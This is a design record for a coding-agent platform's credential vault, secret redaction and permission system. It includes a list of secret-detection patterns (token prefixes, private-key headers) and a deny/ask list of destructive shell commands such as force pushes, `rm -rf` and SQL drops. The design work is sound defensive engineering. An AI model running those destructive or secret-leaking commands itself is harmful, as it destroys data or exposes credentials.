# ADR 0009: Credentials and permissions (secrets in the Library, one permission system)

## Status

Proposed (design only; no code in this ADR's commit). ADR 0000 says an ADR is normally
written in the same commit as the code that enacts it; this one is deliberately written
first because the change is large, touches both stores, the executor and the TUI, and the
owner's decisions below are settled. The three phases in section 13 each land under this
ADR, and the Status moves to Accepted (with an `## Amendments` section for anything that
changed on contact with the code) when phase 3 lands.

## Context

Agents in rework need things only the owner has: a GitHub token for `gh`, a registry
token, a database URL, an SSH key for a deploy host. Today there is no place for them.
The owner either pastes the value into a chat or a task brief, where it goes straight to a
model provider and into `chat_messages`, or exports it in the daemon's shell, where every
command of every role inherits it. At the same time rework gives agents real power and has
no mechanical brake on it. What exists today:

- **The Library has no secret type.** `ItemType` is `skill | tool | report | memory`
  (`src/rework/library/model.py:27-31`). An item's `body` is plaintext in the index row
  (`library/store.py:31`, `LibraryItem.body` at `library/model.py:65`), and
  `GitLibrary.write_body()` (`library/store.py:486-505`) writes it as a markdown file at
  `GitLibrary.body_path_for()` (`library/store.py:483`) and commits it to the canonical
  library git repo, which is mirrored to GitHub. Anything that flows through
  `curation.contribute()` (`library/curation.py:152`, git write at `:215`) is therefore
  published history. A secret must never go down this path.
- **Nothing redacts anything.** There is no masking or redaction primitive anywhere in
  `src/rework`. `run_command` returns raw process output to the model after only a length
  cut (`nodes/tools.py:227-234`). The tool loop stores every tool result in its transcript
  (`nodes/toolloop.py:436`), writes the whole transcript to disk (`_save_loop`,
  `nodes/toolloop.py:126-134`), publishes tool arguments and results as events
  (`nodes/toolloop.py:224-236`, `:428`), and the JSON log formatter writes `getMessage()`
  verbatim (`logs.py:60-79`). Whatever a command prints is persisted in at least five
  places.
- **The jail is advisory.** The `run_command` jail in `nodes/tools.py` is documented as
  advisory (quoted in section 8). The shell string is passed to `create_subprocess_shell`
  (`nodes/tools.py:208`) with the daemon's whole environment (`role_env`,
  `nodes/tools.py:291`, `env = dict(os.environ)` at `:308`).
- **Permission gates exist but nothing in the engine asks them.** `GateKind.PERMISSION`
  ("allow / deny -> approved bool", `kernel/state/records.py:58`) is used only by the
  orchestrator agent (`orchestrator/agent.py:1305`, `:1353`), and the TUI already renders
  Allow / Deny for it (`tui/views/gates.py:48`). The `gates` table has exactly the columns
  `id, mission_id, kind, question, status, decision_note, decision, spec, for_run,
  created_at, decided_at` in both stores (`kernel/state/sqlite.py:74-86`,
  `kernel/state/postgres.py:85-97`); `spec` is free-form JSON that
  `GateManager.request` passes through (`kernel/gates.py:87-115`).
- **Skills, tools and the rest of the Library are open to every role.** Visibility is the
  only control: active items are served (`library/tools.py:80-95`,
  `library/mcp.py:46-56`), and tools are gated once, on activation
  (`library/curation.py:3-7`, `accept_status` at `:129`).

The owner has settled the following. This ADR designs around them and does not reopen them.

1. Credentials are a new Library item type, `credential`. Agents find them like skills;
   the value is encrypted asymmetrically (any machine can add or rotate with a public key;
   only the daemon host holds the private key and decrypts at the moment of use).
2. Values are never shown to a model and never leak into logs or chat. Agents request a
   credential by name; rework injects it as an environment variable for that one command.
   Every held value is redacted from everything stored or shown. A secret pasted into the
   TUI chat is intercepted before it reaches a model.
3. When an agent proposes a credential it proposes the policy and the owner confirms it
   through a gate; when the owner adds one in the TUI the owner sets the policy.
4. One permission system for credentials, skills and tools: scope plus approval mode, a
   permission gate naming role, item and exact command, a hard stop enforced mechanically
   and failing closed, explicitly not the mechanism that decides what agents see, with an
   audit trail the TUI can show.
5. `run_command` gets an editable destructive-command policy where ambiguous matches ask.
6. Model provider API keys stay with the providers (`models.json`, `rework.env`) and are
   out of scope.

## Decision

### 1. Data model and storage (both stores)

**The item rides the existing Library model.** `ItemType` gains `CREDENTIAL = "credential"`.
A credential is a normal `library_items` row (`library/store.py:25-40`): `name` is the
handle the agent requests, `description` says what it is for, `tags` help search,
`provenance` records who created it (`Provenance`, `library/model.py:45-52`), `status`
works as it does for tools: `PROPOSED` until the owner confirms, then `ACTIVE`, `RETIRED`
as the off switch (`library/model.py:34-38`). Search, ranking, the hybrid embedder
(`library/embeddings.py:71`, which embeds only name, description and tags) and `record_use`
work unchanged. The "how to use" text is the item's `body`, as for a skill, with one
difference below. **No column is added to `library_items` and nothing is added to
`LibraryItem`**; the ciphertext deliberately lives in another table so that no
`SELECT *`, `_row_to_item` (`library/store.py:69-96`), `search`, `get_item`, MCP `get` or
`read_text` can ever carry it, by accident or by a future refactor.

**A credential never touches the git write path.** `contribute()` branches on type before
`git.write_body` (`library/curation.py:215`): credential items are written by a dedicated
`CredentialVault` (section 2) and their `body_path` is NULL, so `body_path_for()` and
`write_body()` are never called for them. The usage text stays in the DB row only
(`LibraryItem.body`). `read_item_body` (`library/store.py:443`) then falls back to
`git.read_body`, which returns None when there is no `body_path` (`:507-509`); nothing to
leak. `contribute()` with `type=credential` from an agent tool or the MCP server is
refused with a pointer to `credential_propose` (section 3). Before a credential row is
written, `name`, `description`, `tags` and `body` are scanned with the same detector the
chat uses (section 5); a hit refuses the write ("this looks like a secret value; values go
in the masked field only"). The only data that reaches the DB is metadata and ciphertext;
nothing secret reaches the mirrored repo.

**New tables.** All are `CREATE TABLE IF NOT EXISTS`, additive, and identical in shape on
SQLite and Postgres (the `DOUBLE PRECISION` to `REAL` rewrite at `library/store.py:46`
already handles the one type difference). The envelope is stored as TEXT (base64url), not
BLOB/BYTEA, so the two backends cannot diverge on binary handling.

Library side, in `library/store.py` `_DDL` (opened for both backends by
`open_library_store`, `library/store.py:412-440`):

```sql
CREATE TABLE IF NOT EXISTS credential_keys (
    key_id TEXT PRIMARY KEY,            -- first 8 bytes of SHA-256(public key), hex
    public_key TEXT NOT NULL,           -- base64url, 32-byte X25519
    status TEXT NOT NULL,               -- active | retired
    created_at DOUBLE PRECISION NOT NULL
);
CREATE TABLE IF NOT EXISTS credentials (
    item_id TEXT PRIMARY KEY,           -- library_items.id
    env_name TEXT NOT NULL,             -- the environment variable it is injected as
    envelope TEXT,                      -- the encrypted value; NULL = no value yet
    key_id TEXT,                        -- which public key encrypted it
    enc_version INTEGER NOT NULL DEFAULT 1,
    value_version INTEGER NOT NULL DEFAULT 0,   -- bumped on every rotation
    rotated_at DOUBLE PRECISION,
    updated_by TEXT NOT NULL DEFAULT ''         -- 'owner:tui', 'owner:cli', ...
);
```

State side, in `kernel/state/sqlite.py` (after the `gates` DDL at `:74-86`) and
`kernel/state/postgres.py` (after `:85-97`), because policy, grants and audit are keyed
by mission and run, which live there:

```sql
CREATE TABLE IF NOT EXISTS permission_policies (
    id TEXT PRIMARY KEY,
    subject_type TEXT NOT NULL,         -- credential | skill | tool | command
    subject_id TEXT,                    -- library item id; NULL for command rules
    effect TEXT NOT NULL,               -- allow | deny | ask
    approval TEXT NOT NULL,             -- never | first_use_per_mission | every_use
    scope TEXT NOT NULL,                -- JSON, section 6
    matcher TEXT,                       -- JSON, command rules only (section 8)
    source TEXT NOT NULL,               -- owner | agent_proposed | default
    status TEXT NOT NULL,               -- active | proposed | retired
    note TEXT NOT NULL DEFAULT '',
    created_at DOUBLE PRECISION NOT NULL,
    updated_at DOUBLE PRECISION NOT NULL
);
CREATE TABLE IF NOT EXISTS permission_grants (       -- "first use per mission"
    mission_id TEXT NOT NULL, rule_id TEXT NOT NULL, subject_id TEXT NOT NULL,
    gate_id TEXT NOT NULL, granted_at DOUBLE PRECISION NOT NULL,
    PRIMARY KEY (mission_id, rule_id, subject_id)
);
CREATE TABLE IF NOT EXISTS permission_audit (        -- append-only (section 7)
    id INTEGER/BIGINT PRIMARY KEY,      -- AUTOINCREMENT / IDENTITY, as `events.seq`
    ts DOUBLE PRECISION NOT NULL,
    mission_id TEXT, run_id TEXT, role TEXT, project_id TEXT, model TEXT,
    subject_type TEXT NOT NULL, subject_id TEXT, subject_name TEXT,
    action TEXT NOT NULL, outcome TEXT NOT NULL,
    rule_id TEXT, gate_id TEXT, env_name TEXT,
    command TEXT,                       -- already redacted
    exit_code INTEGER, actor TEXT NOT NULL, detail TEXT NOT NULL DEFAULT ''
);
CREATE INDEX IF NOT EXISTS idx_audit_subject ON permission_audit(subject_id, ts);
CREATE INDEX IF NOT EXISTS idx_audit_mission ON permission_audit(mission_id, ts);
```

(The `INTEGER/BIGINT` line is shorthand: SQLite uses `INTEGER PRIMARY KEY AUTOINCREMENT`
and Postgres `BIGINT GENERATED ALWAYS AS IDENTITY`, exactly as `events` does at
`kernel/state/sqlite.py:87` and `kernel/state/postgres.py:100-101`.) The store interface
gets insert and read methods for audit and none that update or delete a row, on both
backends; the conformance suite parametrizes over both (CLAUDE.md "Dev commands").

The library tables and the state tables share one database substrate but use separate
connections (`library/store.py:4`). The policy engine therefore reads item status through
the library handle and policy rows through the state store; it never joins across them.

### 2. The encryption scheme

**Scheme: X25519 + HKDF-SHA256 + AES-256-GCM with an ephemeral sender key** (an ECIES
construction), implemented with `cryptography` (`hazmat`: `X25519PrivateKey`, `HKDF`,
`AESGCM`). `cryptography` is already in `uv.lock` (`uv.lock:550`, as a transitive
dependency); this ADR makes it a direct dependency in `pyproject.toml` (`dependencies`,
`pyproject.toml:9-32`). No libsodium and no new native library: one wheel, which every
rework machine already installs.

Encrypting (any machine, public key only):

1. Generate an ephemeral X25519 keypair `(e, E)`.
2. `shared = X25519(e, R)` where `R` is the recipient public key from `credential_keys`.
3. `key = HKDF-SHA256(shared, salt = E || R, info = "rework credential v1", len = 32)`.
4. Pad the value to a multiple of 64 bytes with a 2-byte length prefix (hides length).
5. `ct = AES-256-GCM(key, nonce = 12 random bytes, plaintext, aad)` where
   `aad = version || alg || key_id || E || item_id`.
6. Discard `e`. The sender cannot decrypt what it just wrote.

**Envelope** (stored as `rwc1.` + base64url of the concatenation):

| field | bytes | content |
|---|---|---|
| version | 1 | `0x01`, the envelope layout |
| alg id | 1 | `0x01` = X25519 / HKDF-SHA256 / AES-256-GCM (room for later algs) |
| recipient key id | 8 | selects the private key; may be an old key during rotation |
| ephemeral public key | 32 | `E` |
| nonce | 12 | random |
| ciphertext + tag | n + 16 | AES-GCM output; tag authenticates ciphertext and `aad` |

`item_id` is in the AAD, so an envelope copied from one credential row to another
decrypts to an authentication failure, not to the other credential's value. A row-write
attacker can delete or swap rows (availability) but cannot make credential A resolve to a
value they chose without the public key, which is public: see the substitution risk in
the threat model. Any change to the layout or algorithm bumps the version/alg byte and
`credentials.enc_version`; decrypt dispatches on them and an unknown pair fails closed.

**Why this and not a sealed box.** A libsodium sealed box would also work and is listed
under Alternatives. The deciding factors: AEAD with associated data lets the envelope bind
to the item and carry an algorithm id; no new native dependency; and explicit, reviewable
key schedule. Authenticated ciphertext means a flipped bit is a clean `unavailable:
corrupt`, never a garbage value injected into a command.

### 3. Key lifecycle, agent-proposed credentials, and the missing private key

**Files.** On the daemon host (rewvis): `~/.rework/keys/` (mode 700, the state dir is
`DEFAULT_STATE_DIR`, `config.py:17`) holds `credentials.key` (the 32-byte X25519 private
key, mode 600) and `credentials.pub`. The private key never leaves that directory and is
never stored in the database, an env file, or any role's environment. `role_env` already
redirects rework's own state paths into a per-run scratch dir (`nodes/tools.py:316-323`);
`~/.rework/keys` is added to what a role cannot reach through those redirects, and the
file mode keeps other users out. (A role runs as the same user, so this is not a boundary
against a hostile role; see the threat model.)

**Creation.** `rework keys init` on the daemon host, run once by the owner. It generates
the keypair, writes the files with `O_EXCL` at mode 600, and inserts `(key_id,
public_key, active)` into `credential_keys`. Nothing creates a key implicitly: a daemon
that silently minted a new key after losing the old one would orphan every stored value.

**Public key distribution and pinning.** The public key is not secret; it lives in
`credential_keys`, so a TUI on any machine reads it from the shared store (ADR 0006,
"Store-only"). Because a writer to the DB could substitute their own public key, the TUI
pins the fingerprint on first use in `~/.rework/keys/pinned` and shows a blocking
"the credential key changed" prompt on mismatch. `rework keys fingerprint` prints the key
id on rewvis for out-of-band comparison.

**Backup and restore.** `rework keys export <file>` writes the private key wrapped under
a passphrase (scrypt + AES-256-GCM) for offline storage; `rework keys import <file>`
restores it. Keep the export away from database backups: database backup plus key backup
in one place is full compromise (threat model).

**Rotating the keypair.** `rework keys rotate`: generate a new pair, add it as `active`,
mark the old `retired`, and re-wrap every credential on the daemon (decrypt with the key
named by the envelope's key id, encrypt to the new key, one transaction per row,
`key_id` and `rotated_at` updated). Decryption selects the key by the envelope key id, so a
half-finished rotation still works. The old private key file is renamed
`credentials.<key_id>.key` and kept until `rework keys rotate --finish` verifies no row
references it; deleting it is then the owner's call. Rotating the keypair does not change
any secret value: if the old private key was exposed, values must also be rotated at the
provider.

**Rotating a value.** Owner action (TUI or `rework credential rotate <name>`): enter the
new value masked, encrypt to the active public key, replace `envelope`, bump
`value_version`, set `rotated_at`, write a `rotate` audit row. The old envelope is
overwritten, not versioned; copies in older DB backups stay decryptable with the old
private key, so value rotation at the provider is the real remedy for a leak.

**How an agent adds a credential.** Agents never supply a value: a value in a tool
argument would sit in the agent's transcript, which is exactly what this design prevents.
The agent calls a new tool `credential_propose(name, description, how_to_use, env_name,
proposed_policy)`. rework creates the item `PROPOSED` with no envelope plus a
`permission_policies` row `source='agent_proposed', status='proposed'`, and opens a
`GateKind.PERMISSION` gate (section 7) whose `spec` carries the proposed scope and
approval mode. The owner reviews, edits the policy if they wish, and decides. On Allow the
TUI asks for the value in the masked field, encrypts it client-side, and flips item and
policy to `ACTIVE`/`active`. On Deny the proposal is `RETIRED`. Until a value exists the
credential resolves as `unavailable: no value set`. If an agent has found a secret in the
repo, it reports where; the owner decides whether to register it.

**Missing or wrong private key: fail closed.** At startup the daemon opens the vault.
States and consequences:

| state | what happens |
|---|---|
| private key file present, key id found | normal |
| private key file missing / unreadable | vault is `locked`: every credential resolves `unavailable: private key missing on this host`; one WARNING at start and a banner in the TUI Library view |
| envelope key id not held by this host | that credential: `unavailable: encrypted to key <id>, which this host does not hold` |
| GCM tag fails (tampered, wrong item, wrong key) | that credential: `unavailable: corrupt` plus an audit row |
| unknown version / alg | `unavailable: unsupported envelope` |

"Unavailable" means: `run_command` with that credential returns an error string to the
model naming the credential and the reason, **does not run the command**, writes an audit
row `outcome=unavailable`, and opens no gate (asking the owner to approve something that
cannot work is noise). Nothing is silently skipped, no environment variable of the same
name is substituted from the daemon's own environment, and the command is not run without
the credential. A daemon on another host (an ADR 0008 preview or a sandbox) that lacks the
private key gets exactly this behaviour, which is the intended isolation.

### 4. The injection path

The unit of use is one `run_command` call. A new outermost executor wrapper,
`PermissionExecutor`, wraps the role's executor the way `LibraryAwareExecutor` does
(`library/tools.py:205-245`); because the library wrapper delegates unknown tools inward,
the permission wrapper goes outside it so nothing can route around it. `run_command`'s
`ToolSpec` in `nodes/tools.py` gains an optional `credentials: [name]` argument.

1. **Request by name.** The model calls `run_command(command="gh pr list",
   credentials=["github-token"])`. It learned the name from `library_search`
   (`library/tools.py:61-66`) or `library_read` (`:80-95`), which for a credential return
   name, description, how-to-use, env var name and scope summary, never a value. Search
   output for a credential adds `(use via run_command credentials=[...])`.
   The names resolve through `LibraryHandle.resolve` (`library/tools.py:68-78`) and must be
   `type=credential`, `status=ACTIVE`.
2. **Policy check** (section 6), including the destructive-command policy (section 8).
   Result: allow, deny, or ask.
3. **Gate if required** (section 7). The wrapper blocks the tool call like
   `ask_orchestrator` does (`nodes/escalate.py:1`, a blocking tool rather than an
   `interrupt()`), polling the gate row, which is the source of truth (CLAUDE.md hard
   rule 3).
4. **Audit `started` row** is written before anything is decrypted. If the audit write
   fails, the call is denied.
5. **Decrypt on the daemon host.** The vault decrypts the envelope in memory with the
   private key. The plaintext lives in one local variable of the wrapper.
6. **Environment for that one command.** `env = role_env(workdir)` (`nodes/tools.py:214`)
   plus `env[env_name] = value`, passed only as the `env=` of that one
   `create_subprocess_shell` (`nodes/tools.py:208-215`). `os.environ` is never modified.
   The value is never put in the command string, a file, `argv`, or the process title (so
   `ps` shows nothing). Reserved names (`PATH`, `HOME`, `SHELL`, `LD_*`, `PYTHON*`,
   `REWORK_*`) cannot be a credential's `env_name`; the vault refuses them at creation.
7. **Output through the redactor** (section 5), as bytes, before decode, truncation and
   return.
8. **Audit `finished` row** with the exit code and the redacted command.

**Lifetime and scope.** The variable exists in the initial environment of one shell and
its descendants; it dies with them (the timeout path kills the whole process group,
`_kill_tree`, `nodes/tools.py:220`). It is not in the role process's environment, so the
next command of the same role does not have it unless it asks again and passes policy. The
daemon drops its reference when the call returns. Python cannot reliably zero a `str`
(the limit is stated in the threat model), so the window is "one command plus however long
the interpreter keeps a freed string". It never enters the model context: the tool
arguments carry names only, the result is redacted, and `_short_args`
(`nodes/toolloop.py:34-43`) only ever sees names.

A command a role leaves running in the background (`nohup ... &`) keeps its environment;
that is inherent to environment injection and is covered under limits.

### 5. Redaction

**One primitive, many choke points.** A `Redactor` (new module, e.g.
`src/rework/security/redact.py`) holds a process-wide needle set and exposes
`redact_bytes`, `redact_text` and `redact_json` (walks dicts/lists, redacts every string
leaf). It is greenfield: no code in `src/rework` does this today.

**What it holds.** (a) Every credential value: the daemon decrypts all credentials into
process memory at startup and on a change (it polls `credentials.rotated_at`/row count);
the set is never written anywhere. A vault that is `locked` holds no credential needles
(the WARNING says so). (b) Values injected into the current command, added for the
duration of the call even if (a) missed them. (c) The provider keys: the values of the
variables named by `api_key_env` in `models.json` (`kernel/llm/catalog.py:33`, `:60`) and
of every `REWORK_*_KEY` in the environment, as **redact-only** needles. They stay where
they are (section 10).

**How values are matched.** Each value `v` of length >= 8 yields needles:

| form | needle |
|---|---|
| exact | `v` |
| base64 | standard and URL-safe, padded and unpadded, at all three byte alignments (so a value embedded inside a larger base64 blob is caught) |
| hex | lower and upper case |
| percent-encoded | `urllib.parse.quote(v, safe="")` |
| JSON-escaped | `json.dumps(v)[1:-1]` |
| shell-quoted | `shlex.quote(v)` |
| partial | for `len(v) >= 24`: its first 12 and last 12 characters as separate needles |

All needles are compiled into one alternation sorted longest-first and applied to the
whole buffer. The replacement is `[REDACTED:<credential-name>]` for exact and encoded forms
and `[REDACTED]` for partial and provider-key hits. Values shorter than 8 characters are
exact-match only and the TUI marks them "weak"; creation warns that short values cannot be
redacted reliably. Entropy is **not** used to redact command output (it would shred git
SHAs and hashes). It is used only for detection of a pasted secret, below.

**Detection of a pasted secret (chat and gate answers).** A detector flags a message that
contains: a known prefix shape (`ghp_`, `github_pat_`, `gho_`, `sk-`, `sk-ant-`, `AKIA`,
`xox[abp]-`, `glpat-`, `npm_`), a PEM `-----BEGIN ... PRIVATE KEY-----`, a JWT shape, a
`password=`/`token=`/`secret=` assignment with a long value, a database URL with a
password, or any whitespace-free token of >= 20 chars with Shannon entropy >= 4.0 bits/char
and at least three character classes. It is tuned for recall; the owner can override a
false positive (section 9).

**Where it hooks in** (the choke points, in the order data flows):

| path | real code | hook |
|---|---|---|
| command output | `nodes/tools.py:218` (`communicate`), `:224` (timeout partial), `:227-233` (decode + truncate) | `redact_bytes(out)` **before** decode and truncation: the 4000+4000 char cut can no longer split a value into two unmatchable halves |
| command string | `nodes/tools.py:216`, `_register_command` writes it to a JSON file (`:359`) | redact the string before registering; the model's own command may embed a pasted value |
| tool-loop transcript | `nodes/toolloop.py:436` (appended), `:131` (`_save_loop` to disk) | `redact_json(messages)` at append and again at save |
| trajectory events | `nodes/toolloop.py:224-236` (`emit`), `:428` (`tool_result`) | `redact_json(payload)` in `emit` |
| every event | `InProcessEventBus.publish` (`kernel/events/bus.py:37`) | `redact_json(event.payload)` before `append_event` |
| persisted records | `StateStore` is a Protocol (`kernel/state/store.py`); `append_event`, `create_gate`, `decide_gate`, run artifact/`complete_run`, `append_chat_message` | a `RedactingStore` decorator around either backend, applied where the store is opened, so SQLite and Postgres get it once |
| logs | `JsonFormatter.format` (`logs.py:60-79`) and the console formatter (`logs.py:106`) | redact `msg` and `exc` |
| reports | `_render_md` (`cli/__init__.py:582`) and the TUI's report render | redact the rendered text |
| Library writes | `curation.contribute` (`library/curation.py:152`), before `write_body` (`:215`) | redact `body`/`description`: reports and memories are written to the mirrored repo |
| PR title/body | `engine._create_pr` (`orchestrator/engine.py:739`), `pr_create` (`nodes/gh.py:15-36`) | last-mile `redact_text(title)`, `redact_text(body)` |
| chat to the model | `OrchestratorChat.send` (`orchestrator/chat.py:405`), `_history` (`:434`), recorded at `:437` | the detector refuses a pasted secret before `:431`; stored and displayed text is redacted |
| TUI transcript | `tui/views/work.py:465` and the gate/report views | redact on render too (defense in depth) |

**Streaming vs buffered.** `run_command` buffers the whole output (`communicate()`), so
matching is over a complete buffer and needs no state. Any future streaming path must hold
back the last `max_needle_len - 1` bytes of each chunk until the next chunk arrives; a
test pins this so the first streaming feature cannot regress it.

**Limits (stated, not hidden).** The redactor cannot catch: a value that was transformed
other than as listed (gzip, XOR, ROT13, reversed, split over several lines or commands,
one character per call, spelled out in prose, an image); a value shorter than the
minimum; a secret rework does not hold (a token the repo contains that was never
registered). On binary output the byte-level pass still removes ASCII needles, but the
later `decode(errors="replace")` (`nodes/tools.py:227`) means an encoding of the value
inside compressed or non-UTF-8 data is not recognized. Truncated output is redacted
first, so truncation cannot split a value; partial needles catch fragments from another
cutter. Redaction is a safety net behind "the model never has the value", not the primary
control.

**Commit contents.** A command could write a value into a file (`printenv > x`) that the
handoff then commits. Phase 2 adds a pre-push check: before `push_branch` in `_create_pr`
(`orchestrator/engine.py:739`) the added lines of the diff are matched against the
redactor's needles and the detector; a hit blocks PR creation and opens a permission gate
rather than pushing.

### 6. The policy model and its evaluation order

**Rule.** One row of `permission_policies`: `subject` (a credential, skill or tool item by
id, or `command` for command rules), `effect` (`allow | deny | ask`), `approval` (`never |
first_use_per_mission | every_use`), and a `scope` JSON object with all four keys
mandatory, each a list or the explicit string `"*"`:

```json
{"projects": ["p-ab12"], "roles": ["coder"], "models": ["*"],
 "providers": ["anthropic"], "missions": ["*"]}
```

A rule with a missing key or an unknown key is rejected on save and treated as
non-matching if found in the table (fail closed: never a wildcard by omission). Within one
rule the dimensions combine with AND; inside a dimension the list is OR. `models` and
`providers` refer to the model and provider of the run asking of the run; `missions` match
mission ids; `projects` match `Mission.project_id`.

**Evaluation order**, for a request `R = (subject, role, project, model, provider,
mission, command)`. The first step that yields a result ends evaluation:

1. **Availability.** Item missing, not `ACTIVE`, or (credential) the vault cannot
   decrypt it: `unavailable` (section 3). No gate.
2. **Explicit deny.** Any matching rule with `effect=deny`: **deny**. A deny beats every
   allow regardless of specificity; only the owner editing policy lifts it. No gate.
3. **Scope match.** Collect matching rules with `effect=allow|ask`. None: **default
   deny**. Credentials have no default rule, so a credential nobody wrote a policy for is
   unusable. Skills and tools get one default allow/`never`/all-scope rule per type,
   inserted by migration, so existing behaviour does not change until the owner edits it.
4. **Approval mode.** Among all matching rules, the **strictest** wins (`every_use` >
   `first_use_per_mission` > `never`); an `ask` effect counts as `every_use`. Two matching
   rules therefore never produce a quieter result than either alone.
   - `never`: allow.
   - `first_use_per_mission`: allow if a `permission_grants` row exists for `(mission,
     rule, subject)`, else ask; the Allow decision inserts the grant. The grant covers any
     later command of that subject in that mission within scope; `every_use` exists for
     the owner who wants each command seen.
   - `every_use`: ask.
5. **Command policy** (section 8) is evaluated for every `run_command` regardless of
   credentials, before step 4's result is acted on: if it says ask or deny, that wins over
   an allow. If both a credential and a command rule ask, the owner sees one gate listing
   both reasons.

**Fails closed at each step.** Step 1: undecryptable means unavailable, never "try without
it". Step 2/3: any error reading policy (DB error, malformed JSON, unknown subject type)
denies with the reason, never allows. Step 4: a missing or unreadable grant row asks. The
audit write failing denies. A gate that times out or whose owner cannot be reached denies
(section 7). There is no code path from an error to an allow.

**What policy is not.** It does not filter `library_search`, `library_menu` or `get`
(`library/tools.py:43-66`, `library/mcp.py:31-44`): an agent can still discover a
credential it may not use, and then fails at the gate with a clear denial. Visibility
(status, relevance) and permission (may this role use this, now) stay separate mechanisms
so a policy bug can neither hide an item nor, by hiding it, pretend to protect it.

### 7. Gates and the audit trail

**The gate.** The wrapper opens a gate through `GateManager.request`
(`kernel/gates.py:87`) with `kind=GateKind.PERMISSION`. No new gate kind: the TUI already
renders Allow / Deny (`tui/views/gates.py:48`) and the decision is an approved bool plus
an optional note (`kernel/state/records.py:58`). The question is human text:
`coder (run r-… on claude-sonnet) wants credential 'github-token' (GH_TOKEN) to run:
gh pr list --state open`. The gate id is derived from `(run_id, tool_call_id)`, so a
replayed tool call finds the same gate instead of opening a second one (CLAUDE.md hard
rule 4).

**Where the payload rides: `spec`, no migration.** The gates table has no scope or
resource columns, and the decision is to leave it that way:

```json
{"asked_by": "engine", "detail": "matched: rule pr-01, rule default-git-push",
 "permission": {"v": 1, "subject_type": "credential", "subject_id": "l-…",
   "subject_name": "github-token", "env_name": "GH_TOKEN", "role": "coder",
   "run_id": "…", "project_id": "…", "model": "…", "command": "gh pr list",
   "mode": "every_use", "rule_ids": ["…"], "reasons": ["credential", "command: git push"]}}
```

Reasons: (1) `spec` is already free-form JSON in both stores (`kernel/state/sqlite.py:82`,
`postgres.py:93`), passed through by `GateManager.request` (`kernel/gates.py:104`, `:115`)
and read by the TUI (`tui/views/gates.py:259-263` reads `spec["detail"]` and
`spec["asked_by"]`). (2) Nothing needs to *query* gates by scope: queryable history is
the audit table, which has real columns. (3) A migration would be an `ALTER` on both
stores plus a backfill for rows nothing reads. The `command` in the spec is already
redacted. The `spec["v"]` field makes the shape versionable.

**Who may decide.** Only the owner, from the TUI or the CLI decide path (`GateManager.decide`, `cli/__init__.py:965`). The
orchestrator LLM must not answer an engine-asked permission gate (unlike an escalation it
may answer, `nodes/escalate.py:1`): its gate-deciding tool rejects any gate whose `spec`
has `asked_by="engine"`. A hard stop that another model can click through is not a stop.

**Timeout and denial.** The deadline is `gate.created_at + REWORK_PERMISSION_TIMEOUT_S`
(default 1800), derived from the row, not process uptime (CLAUDE.md hard rule 5). On
timeout the wrapper records `decision_note="timed out"`, status denied, and returns
`denied: permission gate timed out; the command was not run`. On deny it returns
`denied: <note>`; on run abort (the run row no longer running) it returns the same stop
message `ask_orchestrator` uses. In every case the command is not executed, an audit row
records `denied` or `timed_out`, and the model sees a plain refusal with no hint of the
value or how to bypass.

**Audit trail.** `permission_audit` (section 1) is append-only and written by the engine,
never by a model. Actions: `use` (started/finished pair), `ask`, `grant`, `deny`,
`unavailable`, `create`, `rotate`, `retire`, `policy_change`, `chat_intercept`. Rows hold
who (`role`, `run_id`, `model`, `actor`), what (`subject_*`, redacted `command`,
`env_name`), the decision (`outcome`, `rule_id`, `gate_id`) and the result (`exit_code`).
They never hold a value, a fingerprint of one, or its length. The TUI shows the trail
(section 9); `rework permissions log [--item NAME] [--mission ID]` shows it in a shell.

### 8. The destructive-command policy

**Honest framing first.** The `run_command` jail is documented as advisory, in the
`LocalExecutor` docstring (`src/rework/nodes/tools.py:131-136`):

> Known boundary (found live, first real eval run): the jail is ADVISORY for run_command.
> The shell starts inside the workdir, but a command may `cd` to an absolute path outside
> it and work there; inspecting the shell string is not a security boundary.

(the sentence at `:131-134`; `:134-136` adds that the real fix is the Docker executor,
M7). The destructive-command policy inherits that limitation in full. **It is a speed
bump against mistakes, not a sandbox.** It stops a model that is about to `git push -f`
by accident; it does not stop one that is trying to. The advisory disclaimer stays in
the docstring, gains a sentence pointing at this policy, and no document, prompt, gate or
TUI text may describe the policy as isolation or containment. The real containment is the
Docker executor, which this ADR does not replace.

**Default rules** (editable; see below):

| pattern | match |
|---|---|
| `git push --force` / `-f` / `--force-with-lease` / `+refspec` | parsed |
| `git push` to `main` or `master` (explicit, or implicit with HEAD on one) | parsed |
| `git reset --hard` on a branch that exists on a remote | parsed + `git branch -r --contains` |
| deleting remote branches (`git push --delete`, `git push origin :b`) | parsed |
| `rm -rf` / `rm -fr` / `rm -r -f` with a target outside the role's workdir | parsed + path resolution |
| `DROP` / `TRUNCATE` / `DELETE` without `WHERE` via `psql`, `sqlite3`, `mysql` | regex on SQL text |
| `kubectl delete`, `kubectl apply` | parsed |
| `terraform apply`, `terraform destroy` | parsed |
| `docker rm`, `docker rmi`, `docker system prune` | parsed |
| `systemctl stop`, `systemctl restart` | parsed |
| `rework update --target` (`cli/__init__.py:1543-1546`) | parsed |
| `ssh` / `scp` to a host not in the allowed-hosts list | parsed (host extraction) |
| `npm publish`, `twine upload`, `gh release create` | parsed |

**How matching works.** Prefer parsing over regex. The command is tokenized with `shlex`
and split into simple commands on `;`, `&&`, `||`, `|`, `&` and newlines; wrappers
(`sudo`, `env VAR=x`, `time`, `nohup`, `xargs`, `command`, `uv run`) are peeled; and
`bash -c '…'` / `sh -c '…'` payloads with a literal string are parsed recursively. Matching
is then on `argv`: the verb, the subcommand, flags (combined short flags like `-fu` are
expanded), and for `git`, `-C dir` / `-c k=v` options are skipped and `git config alias.*`
is consulted so an alias to a destructive verb is recognized. Regex on the raw string is
used only where there is no argv to parse: the SQL text handed to `psql -c`, `sqlite3 db
'…'`, `mysql -e`, or here-docs piped to them. `WHERE 1=1` and `WHERE true` count as no
`WHERE`.

**Ambiguous matches ask.** The policy asks (opens a permission gate with the reason
"could not determine whether this is destructive") when: the string cannot be tokenized
(unbalanced quotes); the command word is not a literal (`$CMD`, `` `…` ``, `eval`,
`bash -c "$x"`); a pattern's verb matches but its target cannot be determined (`git push`
with no refspec and an unresolvable upstream; an `rm -rf` target with a variable, glob or
`..` that cannot be resolved inside the workdir); SQL arrives from a file or stdin the
daemon cannot read (`psql -f x.sql`, `< dump.sql`); or the host of an `ssh`/`scp` is
non-literal. It does not ask for commands that match nothing: noise would train the owner
to click Allow.

**Where regex on the raw string is all we have, and what we do not see.** (a) SQL text,
above. (b) Anything inside a script or build target: `./deploy.sh`, `make release`,
`npm run publish`, `python -c "subprocess.run(...)"` are not inspected, because the
daemon cannot know what they do; they are *not* ambiguous matches, they are known misses.
